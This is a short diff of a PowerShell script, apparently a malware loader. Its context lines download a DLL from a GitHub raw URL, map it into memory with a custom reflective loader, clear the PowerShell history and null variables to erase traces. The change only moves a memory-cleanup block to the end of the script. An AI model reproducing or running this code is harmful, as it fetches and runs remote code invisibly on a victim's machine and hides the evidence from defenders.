@@ -126,11 +126,6 @@ try {
 $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
 [NativeLoader]::Map($bytes, $true)
 
-
-$bytes = $null
-$plainCSharp = $null
-[GC]::Collect(); [GC]::WaitForPendingFinalizers()
-
 # ৮.২ – PowerShell সেশন হিস্ট্রি ক্লিয়ার (মেমোরি)
 Clear-History -Force
 
@@ -169,3 +164,8 @@ $bytes = $null; $kernel = $null; $type = $null
 [GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
 Invoke-Finalize
+
+
+$bytes = $null
+$plainCSharp = $null
+[GC]::Collect(); [GC]::WaitForPendingFinalizers()
